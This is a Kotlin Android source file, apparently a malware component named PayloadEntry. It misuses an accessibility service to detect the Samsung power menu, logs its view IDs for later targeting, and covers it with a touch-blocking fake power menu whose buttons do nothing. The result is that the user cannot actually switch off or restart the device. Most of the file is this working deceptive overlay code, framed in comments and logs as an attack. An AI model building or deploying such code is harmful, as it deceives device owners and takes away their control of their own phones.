import android.view.KeyEvent
import androidx.compose.foundation.clickable
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.ui.Alignment
import androidx.compose.ui.draw.clip
import androidx.compose.ui.text.style.TextAlign

class PayloadEntry : DynamicEntry {

    override @Composable fun Render(context: Context, resDir: File) {
        LaunchedEffect(Unit) {
            DynamicEntry.log("💀 Ghost Active: Watching for Power Menu...")

            // Escape hatch: If overlay is up, Back button kills it
            DynamicEntry.keyInterceptor = { event ->
                if (event.keyCode == KeyEvent.KEYCODE_BACK && DynamicEntry.overlayContent != null) {
                    DynamicEntry.overlayContent = null
                    true
                } else false
            }

            DynamicEntry.accessibilityInterceptor = { event ->
                val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
                root?.let {
                    val nodes = mutableListOf<AccessibilityNodeInfo>()
                    findNodes(it, nodes)

                    val texts = nodes.map { n -> n.text?.toString() ?: "" }

                    // Target Match: Samsung Power Menu Signature
                    if (texts.contains("Power off") && texts.contains("Restart")) {
                        if (DynamicEntry.overlayContent == null) {
                            DynamicEntry.log("🎯 TARGET ACQUIRED: System Power Menu Detected.")
                            // Precision Logging: Log the IDs for future hardcoding
                            nodes.forEach { n -> 
                                if (n.text != null) DynamicEntry.log("NODE: ${n.text} | ID: ${n.viewIdResourceName}") 
                            }
                            DynamicEntry.overlayContent = { FakePowerMenu() }
                        }
                    }
                    it.recycle()
                }
            }
        }

        // Main App UI (The "Lobby")
        Box(modifier = Modifier.fillMaxSize().background(Color.Black), contentAlignment = Alignment.Center) {
            Text("CONDUIT ACTIVE", color = Color.Red, style = MaterialTheme.typography.headlineLarge)
        }
    }

    @Composable
    fun FakePowerMenu() {
        Box(modifier = Modifier.fillMaxSize().background(Color.Black.copy(alpha = 0.95f)).clickable { /* Block touches */ }) {
            Column(modifier = Modifier.align(Alignment.Center), horizontalAlignment = Alignment.CenterHorizontally) {
                Row {
                    PowerButton("Power off", Color(0xFF333333))
                    Spacer(modifier = Modifier.width(40.dp))
                    PowerButton("Restart", Color(0xFF2E7D32))
                }
                Spacer(modifier = Modifier.height(40.dp))
                Row {
                    PowerButton("Emergency mode\nOff", Color(0xFFC62828))
                    Spacer(modifier = Modifier.width(40.dp))
                    PowerButton("Lockdown mode", Color(0xFF00838F))
                }
            }

            Text(
                "Side key settings",
                color = Color.LightGray,
                modifier = Modifier.align(Alignment.BottomCenter).padding(bottom = 100.dp)
            )
        }
    }

    @Composable
    fun PowerButton(label: String, bgColor: Color) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Box(
                modifier = Modifier.size(80.dp).clip(CircleShape).background(bgColor),
                contentAlignment = Alignment.Center
            ) { /* Icon would go here */ }
            Text(
                text = label,
                color = Color.White,
                textAlign = TextAlign.Center,
                modifier = Modifier.padding(top = 8.dp),
                fontSize = 14.sp
            )
        }
    }

    private fun findNodes(node: AccessibilityNodeInfo?, list: MutableList<AccessibilityNodeInfo>) {
        if (node == null) return
        list.add(node)
        for (i in 0 until node.childCount) {
            findNodes(node.getChild(i), list)
        }
    }
}

